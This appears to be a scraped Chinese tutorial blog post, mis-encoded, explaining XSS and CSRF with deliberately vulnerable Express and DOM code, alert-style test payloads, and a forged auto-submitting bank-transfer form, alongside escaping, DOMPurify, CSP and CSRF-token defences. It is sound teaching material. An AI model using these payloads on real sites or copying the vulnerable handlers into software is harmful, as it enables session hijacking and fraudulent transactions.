.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è¿™æ˜¯æˆ‘ä»¬å‰ç«¯æœ€å¸¸è§çš„ä¸¤ç§æ”»å‡»æ‰‹æ®µï¼Œä¹Ÿæ˜¯é¢è¯•ä¸­æœ€å¸¸è€ƒçš„å‰ç«¯æ”»å‡»ã€‚è¿™ç¯‡æ–‡ç« æˆ‘ç”¨æœ€ç²¾ç‚¼ã€æœ€ä¼˜é›…ï¼Œä¹Ÿæ˜¯é¢è¯•å®˜æœ€å–œæ¬¢çš„å›ç­”æ–¹å¼æ¥è®²è§£ä¸‹ XSS å’Œ CSRFã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰</h2>
<h3 data-id="heading-1">åŸç†</h3>
<p>æ”»å‡»è€…æŠŠ <strong>æ¶æ„è„šæœ¬</strong> æ³¨å…¥åˆ°å—ä¿¡ä»»é¡µé¢å¹¶è¢«æµè§ˆå™¨æ‰§è¡Œï¼Œè„šæœ¬ åˆ©ç”¨é¡µé¢çš„ä¿¡ä»»ä¸Šä¸‹æ–‡ï¼ˆCookiesã€localStorageã€DOMï¼‰çªƒå–æ•°æ®æˆ–åŠ«æŒä¼šè¯ã€‚</p>
<h3 data-id="heading-2">å¸¸è§ç±»å‹</h3>
<ul>
<li>â€‹<strong>åå°„å‹</strong>â€‹ï¼ˆå‚æ•°æˆ–è·¯å¾„ç›´æ¥åå°„åˆ°é¡µé¢å¹¶æ‰§è¡Œï¼‰</li>
<li>â€‹<strong>å­˜å‚¨å‹</strong>â€‹ï¼ˆæ¶æ„å†…å®¹å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œå…¶ä»–ç”¨æˆ·è®¿é—®æ—¶è§¦å‘ï¼‰</li>
<li>â€‹<strong>DOM-based</strong>â€‹ï¼ˆå®¢æˆ·ç«¯ä¸å®‰å…¨çš„ DOM æ“ä½œå¯¼è‡´æ‰§è¡Œï¼Œå’ŒæœåŠ¡å™¨æ— å…³ï¼‰</li>
</ul>
<h3 data-id="heading-3">æœ€å°å¤ç°ç¤ºä¾‹ï¼ˆä¸å®‰å…¨çš„åç«¯ + ä¸å®‰å…¨çš„å‰ç«¯ï¼‰</h3>
<p><strong>åç«¯ï¼ˆExpress â€” å±é™©ç¤ºä¾‹ï¼‰</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// server.jsï¼ˆç¤ºä¾‹ï¼Œä»…æ¼”ç¤ºä¸å®‰å…¨è¡Œä¸ºï¼‰</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/search'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span> || <span class="hljs-string">''</span>;
  <span class="hljs-comment">// ç›´æ¥æŠŠç”¨æˆ·è¾“å…¥æ‹¼åˆ° HTML ä¸­ â€”â€” å±é™©ï¼</span>
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`&lt;html&gt;&lt;body&gt;æœç´¢: <span class="hljs-subst">${q}</span>&lt;/body&gt;&lt;/html&gt;`</span>);
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
</code></pre>
<p>è®¿é—® <code>/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code> ä¼šæ‰§è¡Œè„šæœ¬ï¼ˆåå°„å‹ï¼‰ã€‚</p>
<p><strong>å‰ç«¯ DOM XSSï¼ˆå±é™©ï¼‰</strong></p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"out"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> q = location.<span class="hljs-property">search</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'q='</span>)[<span class="hljs-number">1</span>] || <span class="hljs-string">''</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'out'</span>).<span class="hljs-property">innerHTML</span> = q; <span class="hljs-comment">// ä¸è½¬ä¹‰ â€”â€” å±é™©ï¼ˆDOM XSSï¼‰</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-4">å®æˆ˜é˜²èŒƒè¦ç‚¹</h3>
<ol>
<li>â€‹**è¾“å‡ºç¼–ç ï¼ˆæœåŠ¡å™¨ç«¯ï¼‰**â€‹ï¼šæ‰€æœ‰æ’å…¥ HTML çš„å†…å®¹åš HTML è½¬ä¹‰ï¼ˆ<code>&amp;&lt;&gt;\"'</code>ï¼‰ã€‚</li>
<li>â€‹<strong>å‰ç«¯æœ€å°åŒ– innerHTML</strong>â€‹ï¼šå°½é‡ç”¨æ¡†æ¶ç»‘å®šï¼ˆReact/Vue çš„æ¨¡æ¿ï¼‰æ›¿ä»£ <code>innerHTML</code>ã€‚
<blockquote>
<p>æ¡†æ¶æ¡†å‡ºæ¥çš„æ’å€¼ï¼ˆ<code>{value}</code> / <code>{{ value }}</code>ï¼‰ä¼šâ€‹<strong>è‡ªåŠ¨åš HTML è½¬ä¹‰</strong>â€‹ï¼ŒæŠŠ <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ã€<code>"</code>ã€<code>'</code> ç­‰å…³é”®å­—ç¬¦æ›¿æ¢æˆå®ä½“ï¼ˆ<code>&amp;lt;</code> ç­‰ï¼‰ï¼Œä»è€ŒæŠŠæ”»å‡»è„šæœ¬å½“æ–‡æœ¬æ˜¾ç¤ºï¼Œè€Œä¸æ˜¯æ‰§è¡Œã€‚</p>
</blockquote>
</li>
<li>â€‹<strong>å¯Œæ–‡æœ¬ç™½åå•æ¸…æ´—</strong>â€‹ï¼šå¯¹äºå¿…é¡»å­˜å‚¨/æ¸²æŸ“çš„ HTMLï¼ˆå¯Œæ–‡æœ¬ï¼‰ï¼Œåç«¯ç”¨ç™½åå• sanitizerï¼ˆæ¯”å¦‚ <code>bleach</code> / <code>html-sanitizer</code>ï¼‰ï¼Œå‰ç«¯å†ç”¨ DOMPurify åšä¸€æ¬¡ä¿æŠ¤ï¼Œå¯¹æ ‡ç­¾å±æ€§ç­‰è¿›è¡Œæ¸…æ´—ã€‚</li>
<li>â€‹<strong>Content-Security-Policyï¼ˆCSPï¼‰å¤´éƒ¨</strong>â€‹ï¼šç¦æ­¢å†…è”è„šæœ¬ã€åªå…è®¸å¯ä¿¡æºã€‚</li>
<li>â€‹<strong>HttpOnly Cookie å¤´éƒ¨</strong>â€‹ï¼štoken/cookie è®¾ç½® HttpOnlyï¼Œé˜²æ­¢è¢«è„šæœ¬ç›´æ¥è¯»å–ï¼ˆå‡è½» XSS åæœï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-5">ç¤ºä¾‹ä»£ç  â€” å®‰å…¨æ”¹é€ </h3>
<p><strong>åç«¯ï¼ˆExpress + è½¬ä¹‰ï¼‰</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">escapeHtml</span> = s =&gt; <span class="hljs-title class_">String</span>(s)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">'&amp;amp;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">'&amp;lt;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">'&amp;gt;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/"/g</span>, <span class="hljs-string">'&amp;quot;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/'/g</span>, <span class="hljs-string">'&amp;#39;'</span>);

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/search'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> q = escapeHtml(req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span> || <span class="hljs-string">''</span>);
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`&lt;html&gt;&lt;body&gt;æœç´¢: <span class="hljs-subst">${q}</span>&lt;/body&gt;&lt;/html&gt;`</span>);
});
</code></pre>
<p><strong>å‰ç«¯ï¼ˆè‹¥å¿…é¡»æ¸²æŸ“ HTMLï¼Œç”¨ DOMPurifyï¼‰</strong></p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-comment">&lt;!-- npm install dompurify --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://unpkg.com/dompurify@2.&lt;!--version--&gt;/dist/purify.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// htmlFromServer æ¥è‡ªåç«¯ APIï¼Œä»éœ€ sanitize</span>
  <span class="hljs-keyword">const</span> htmlFromServer = <span class="hljs-string">'&lt;img src=x onerror=alert(1)&gt;'</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'content'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(htmlFromServer);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>è®¾ç½® CSPï¼ˆNginx/Express header ç¤ºä¾‹ï¼‰</strong></p>
<pre><code class="hljs language-Plain" lang="Plain">Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none';
</code></pre>
<h2 data-id="heading-6">äºŒã€CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</h2>
<h3 data-id="heading-7">åŸç†</h3>
<p>åˆ©ç”¨ç”¨æˆ·å·²ç™»å½•ä¸”æµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Šå‡­è¯ï¼ˆcookieï¼‰çš„ç‰¹æ€§ï¼Œæ”»å‡»è€…è¯±å¯¼ç”¨æˆ·å‘èµ·å¯¹å—ä¿¡ä»»ç«™ç‚¹çš„è¯·æ±‚ï¼ˆå¦‚é€šè¿‡è‡ªåŠ¨æäº¤è¡¨å•æˆ–å›¾ç‰‡è¯·æ±‚ï¼‰ï¼Œä»è€Œåœ¨ç”¨æˆ· åä¸‹æ‰§è¡Œæœªæˆæƒæ“ä½œã€‚</p>
<h3 data-id="heading-8">æœ€å°å¤ç°ç¤ºä¾‹ï¼ˆæ”»å‡»è€…é¡µé¢ï¼‰</h3>
<p>å¦‚æœ <code>bank.com/transfer</code> æ¥å— GET æˆ– POST å¹¶ä¾èµ– cookie éªŒè¯ï¼Œæ”»å‡»é¡µé¢å¯è¿™æ ·å†™ï¼š</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-comment">&lt;!-- auto.htmlï¼ˆåœ¨æ”»å‡»è€…åŸŸåä¸Šï¼‰ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://bank.com/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"f"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"1000"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'f'</span>).<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ç”¨æˆ·åœ¨å·²ç™»å½• <code>bank.com</code> çš„æƒ…å†µä¸‹è®¿é—®æ”»å‡»é¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å¸¦ä¸Š <code>bank.com</code> çš„ cookieï¼Œå¯¼è‡´è½¬è´¦ã€‚</p>
<h3 data-id="heading-9">é˜²æŠ¤è¦ç‚¹</h3>
<ol>
<li>â€‹<strong>SameSite Cookie</strong>â€‹ï¼šæŠŠ session/cookie è®¾ç½® <code>SameSite=Lax</code> æˆ– <code>Strict</code>ï¼ˆLax å¯¹ POST æœ‰ä¿æŠ¤ï¼Œé€‚é…å¤§å¤šæ•°æƒ…å½¢ï¼‰ã€‚</li>
<li>â€‹**CSRF Tokenï¼ˆåŒæ­¥/åŒæäº¤ï¼‰**â€‹ï¼šæœåŠ¡ç«¯ç”Ÿæˆéšæœº tokenï¼Œå“åº”ç»™å‰ç«¯ï¼›æ•æ„Ÿè¯·æ±‚å¿…é¡»æºå¸¦å¹¶æ ¡éªŒè¯¥ tokenã€‚
<blockquote>
<p>è¯¥ token ä¸åŒäº jwt token ï¼Œæ­¤å¤„çš„ csrf-token åªä¸ºé…åˆ session+cookie ä¼ ç»Ÿé‰´æƒç­–ç•¥åšå®‰å…¨é˜²æŠ¤ã€‚</p>
</blockquote>
</li>
<li>â€‹<strong>æ£€æŸ¥ Origin/Referer</strong>â€‹ï¼šå¯¹è·¨ç«™è¯·æ±‚æ ¡éªŒ <code>Origin</code> æˆ– <code>Referer</code> å¤´ï¼ˆé€šå¸¸å¯¹ POST/PUT/DELETE ç”Ÿæ•ˆï¼‰ã€‚</li>
<li>â€‹<strong>é¿å…ç”¨ cookie åšå¯¹å¤– API çš„è®¤è¯</strong>â€‹ï¼šé‡‡ç”¨ <code>Authorization: Bearer</code> header çš„ token æœºåˆ¶ï¼ˆåªæœ‰ JS èƒ½è¯»/å†™ï¼‰ï¼Œç»“åˆ CORS é™åˆ¶ã€‚</li>
<li>â€‹<strong>æ•æ„Ÿæ“ä½œäºŒæ¬¡ç¡®è®¤</strong>â€‹ï¼šå¯†ç /OTP/äºŒæ¬¡éªŒè¯ã€‚</li>
</ol>
<h3 data-id="heading-10">ç¤ºä¾‹ä»£ç ï¼ˆExpress + scrf token + csurfï¼‰</h3>
<blockquote>
<p><code>csurf</code> ä½¿ç”¨ â€‹**åŒæäº¤éªŒè¯æœºåˆ¶ï¼ˆCSRF Tokenï¼‰**â€‹ï¼š</p>
<ol>
<li>æœåŠ¡ç«¯ç”Ÿæˆä¸€ä¸ª CSRF Tokenï¼Œæ”¾åœ¨ cookie æˆ– session ä¸­ã€‚</li>
<li>å‰ç«¯æ¯æ¬¡å‘ POST/PUT/DELETE è¯·æ±‚è¦å¸¦ä¸Šè¿™ä¸ª tokenï¼Œå¸¸æ”¾åœ¨è¯·æ±‚å¤´æˆ–è¡¨å•éšè—å­—æ®µï¼Œæ¯”å¦‚ï¼š<code>X-CSRF-Token: ey2423482374823748234</code></li>
<li>æœåŠ¡ç«¯æ ¡éªŒ tokenï¼Œæ˜¯å¦åŒ¹é…ã€æ˜¯å¦æœªè¿‡æœŸã€æ˜¯å¦åˆæ³•ã€‚</li>
</ol>
</blockquote>
<p><strong>åç«¯ï¼ˆExpressï¼‰</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// server.js</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cookie-parser'</span>);
<span class="hljs-keyword">const</span> csurf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'csurf'</span>);

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());
app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">csurf</span>({ <span class="hljs-attr">cookie</span>: { <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'lax'</span> } }));

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/csrf-token'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// è¿”å› token ç»™ SPA å‰ç«¯ï¼ˆç”¨äºåç»­è¯·æ±‚ headerï¼‰</span>
  res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">csrfToken</span>: req.<span class="hljs-title function_">csrfToken</span>() });
});

app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/transfer'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// csurf ä¸­é—´ä»¶ä¼šè‡ªåŠ¨æ ¡éªŒè¯·æ±‚ä¸­çš„ tokenï¼ˆ_csrf å­—æ®µæˆ– X-CSRF-Token headerï¼‰</span>
  <span class="hljs-comment">// æ‰§è¡Œè½¬è´¦é€»è¾‘...</span>
  res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">ok</span>: <span class="hljs-literal">true</span> });
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
</code></pre>
<p><strong>å‰ç«¯ SPAï¼ˆè·å– token å¹¶åœ¨è¯·æ±‚å¤´ä¸­å‘é€ï¼‰</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// åˆå§‹åŒ–æ—¶è·å– token</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> r = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/csrf-token'</span>, { <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span> });
  <span class="hljs-keyword">const</span> { csrfToken } = <span class="hljs-keyword">await</span> r.<span class="hljs-title function_">json</span>();
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__CSRF_TOKEN</span> = csrfToken;
}

<span class="hljs-comment">// å‘é€å—ä¿æŠ¤è¯·æ±‚</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/transfer'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>, <span class="hljs-comment">// ä»ç„¶å¸¦ cookie</span>
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      <span class="hljs-string">'X-CSRF-Token'</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">__CSRF_TOKEN</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">to</span>: <span class="hljs-string">'bob'</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">100</span> })
  });
}
</code></pre>
<p>åªç”¨ SameSiteï¼ˆç®€æ´æ›¿ä»£ï¼Œé€‚ç”¨å¤šæ•°åœºæ™¯ï¼‰ï¼Œåœ¨æœåŠ¡ç«¯è®¾ç½® cookieï¼š</p>
<pre><code class="hljs language-Plain" lang="Plain">Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/;
</code></pre>
<p>è¿™å°±èƒ½é˜»æ­¢ç»å¤§å¤šæ•°é€šè¿‡ç¬¬ä¸‰æ–¹é¡µé¢è§¦å‘çš„ POST/è·¨ç«™æ•æ„Ÿæ“ä½œã€‚</p>
<h2 data-id="heading-11">ä¸‰ã€XSS ä¸ CSRF çš„å…³é”®æ€»ç»“</h2>
<p>æ¦‚å¿µï¼š</p>
<ul>
<li>â€‹<strong>XSS</strong>â€‹ï¼šæ”»å‡»è€…æ³¨å…¥è„šæœ¬å¹¶å¯è¯»å–é¡µé¢å†…å®¹ï¼ˆæ›´å¼ºï¼‰ï¼Œæ ¹æºæ˜¯è¾“å‡º/DOM ä¸å®‰å…¨ã€‚</li>
<li>â€‹<strong>CSRF</strong>â€‹ï¼šæ”»å‡»è€…ä¼ªé€ ç”¨æˆ·è¯·æ±‚ï¼Œæ— æ³•ç›´æ¥è¯»å–å“åº”ï¼Œæ ¹æºæ˜¯æµè§ˆå™¨è‡ªåŠ¨å¸¦å‡­è¯ã€‚</li>
</ul>
<p>é˜²æŠ¤ï¼š</p>
<ol>
<li>åç«¯ç»Ÿä¸€ä½¿ç”¨ HTML escape åº“ï¼›å¯Œæ–‡æœ¬èµ°ç™½åå• sanitizerã€‚</li>
<li>å…¨ç«™ Cookieï¼š<code>HttpOnly; Secure; SameSite=Lax</code>ã€‚</li>
<li>å¯¹éœ€è¦çš„é¡µé¢å¼€å¯ CSPï¼ˆreport-only å…ˆè§‚æµ‹ï¼Œå† enforceï¼‰ã€‚</li>
<li>SPAï¼šé¦–æ¬¡è·å– CSRF token å¹¶åœ¨åç»­è¯·æ±‚ä¸­ä»¥ header å‘é€ï¼›æœåŠ¡ç«¯æ£€æŸ¥ <code>Origin</code>/<code>Referer</code>ã€‚</li>
<li>CI/ä»£ç å®¡æŸ¥ç¦æ­¢éšæ„ä½¿ç”¨ <code>innerHTML</code>/<code>eval</code>/<code>dangerouslySetInnerHTML</code>ã€‚</li>
<li>å¯¹å…³é”®æ“ä½œå®æ–½äºŒæ¬¡éªŒè¯ï¼ˆå¯†ç /OTPï¼‰ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‘Šåˆ«å†—ä½™ï¼ç”¨Python + æ˜ŸæAPIï¼Œä¸€é”®è‡ªåŠ¨åŒ–å¤„ç†Shopifyè®¢å•]]></title>    <link>https://juejin.cn/post/7576918517238497330</link>    <guid>https://juejin.cn/post/7576918517238497330</guid>    <pubDate>2025-11-27T05:48:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576918517238497330" data-draft-id="7576978338754412594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‘Šåˆ«å†—ä½™ï¼ç”¨Python + æ˜ŸæAPIï¼Œä¸€é”®è‡ªåŠ¨åŒ–å¤„ç†Shopifyè®¢å•"/> <meta itemprop="keywords" content="è¿è¥,æ˜é‡‘æ—¥æŠ¥"/> <meta itemprop="datePublished" content="2025-11-27T05:48:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜Ÿæäº’è”"/> <meta itemprop="url" content="https://juejin.cn/user/1370462103538153"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‘Šåˆ«å†—ä½™ï¼ç”¨Python + æ˜ŸæAPIï¼Œä¸€é”®è‡ªåŠ¨åŒ–å¤„ç†Shopifyè®¢å•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1370462103538153/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜Ÿæäº’è”
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:48:22.000Z" title="Thu Nov 27 2025 05:48:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li 